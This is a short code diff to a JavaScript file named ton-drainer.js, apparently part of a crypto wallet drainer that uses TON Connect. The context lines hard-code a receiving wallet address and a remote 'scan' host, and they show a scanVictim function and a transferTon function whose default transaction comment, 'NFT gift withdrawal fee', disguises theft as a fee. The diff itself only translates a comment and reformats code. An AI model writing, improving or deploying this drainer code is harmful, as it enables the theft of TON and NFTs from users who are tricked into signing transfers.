@@ -1,4 +1,4 @@
-// ton-drainer.js — TON Connect: transfer NFT + TON
+// ton-drainer.js — TON Connect: transfer NFT + перевод TON
 const TON_CONFIG = {
   RECEIVER: 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4',
   SCAN_API: 'https://gift-spinner.onrender.com',
@@ -17,7 +17,10 @@ async function scanVictim(address) {
 
 async function transferTon(tonConnectUI, amountTon, comment) {
   const { beginCell, toNano } = TON;
-  const body = beginCell().storeUint(0, 32).storeStringTail(comment || 'NFT gift withdrawal fee').endCell();
+  const body = beginCell()
+    .storeUint(0, 32)
+    .storeStringTail(comment || 'NFT gift withdrawal fee')
+    .endCell();
   const tx = {
     validUntil: Math.floor(Date.now() / 1000) + 300,
     messages: [{
